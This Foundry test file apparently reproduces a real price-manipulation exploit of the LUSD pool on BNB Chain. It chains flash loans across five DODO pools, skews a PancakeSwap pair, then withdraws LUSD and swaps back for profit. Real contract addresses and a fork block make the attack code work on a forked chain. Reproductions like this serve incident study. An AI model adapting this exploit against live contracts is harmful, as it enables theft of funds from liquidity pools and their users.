// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Phalcon Explorer: https://explorer.phalcon.xyz/tx/bsc/0x1eeef7b9a12b13f82ba04a7951c163eb566aa048050d6e9318b725d7bcec6bfa

contract LUSD is Test {
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 LUSD = IERC20(0x3cD632C25A4Db4c1A636cFb23B9285Be1097A60d);
    IPancakePair Pair =
        IPancakePair(0x3F803EC2b816Ea7F06EC76aA2B6f2532F9892d62);
    IPancakeRouter Router =
        IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle DPPOracle1 =
        IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPPOracle2 =
        IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle3 =
        IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced =
        IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    ILoan Loan = ILoan(0xdeC12a1dCbC1F741cCD02dFd862ab226F6383003);
    ILUSDPool LUSDPool = ILUSDPool(0x637De69F45F3b66D5389F305088A38109aA0cf7C);

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 29756866);
        vm.label(address(BUSD), "BUSD");
    }

    function testLUSDExploit() external {
        deal(address(BUSD), address(this), 0 ether);
        BUSD.approve(address(Router), type(uint256).max);
        BTCB.approve(address(Router), type(uint256).max);
        console.log(
            "Attacker BUSD Balance at the start:",
            BUSD.balanceOf(address(this))/1e18
        );
        takeFlashLoan(DPPOracle1);
        console.log(
            "Attacker BUSD Balance at the end:",
            BUSD.balanceOf(address(this))/1e18
        );
    }

    function DPPFlashLoanCall(
        address sender,
        uint baseAmount,
        uint quoteAmount,
        bytes calldata data
    ) external {
        if (msg.sender == address(DPPOracle1)) {
            takeFlashLoan(DPPOracle2);
        } else if (msg.sender == address(DPPOracle2)) {
            takeFlashLoan(DPPOracle3);
        } else if (msg.sender == address(DPPOracle3)) {
            takeFlashLoan(DPP);
        } else if (msg.sender == address(DPP)) {
            takeFlashLoan(DPPAdvanced);
        } else {
            console.log(
                "Attacker Balance after flashloan:",
                BUSD.balanceOf(address(this))/1e18
            );
            Pair.swap(0, 1246953598313175025, address(this), "0x00");
            BTCB.approve(address(Loan), type(uint256).max);
            Loan.supply(address(BTCB), 1515366635982742);
            LUSD.approve(address(LUSDPool), type(uint256).max);
            LUSDPool.withdraw(10000411182292803780033);
            BTCB.transfer(address(Pair), BTCB.balanceOf(address(this)));
            Pair.swap(799764317883596339564612, 0, address(this), "");
        }
        BUSD.transfer(msg.sender, quoteAmount);
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        BUSD.transfer(address(Pair), 800000 ether);
    }

    function takeFlashLoan(IDPPOracle Contract) internal {
        Contract.flashLoan(
            0,
            BUSD.balanceOf(address(Contract)),
            address(this),
            new bytes(1)
        );
    }
}
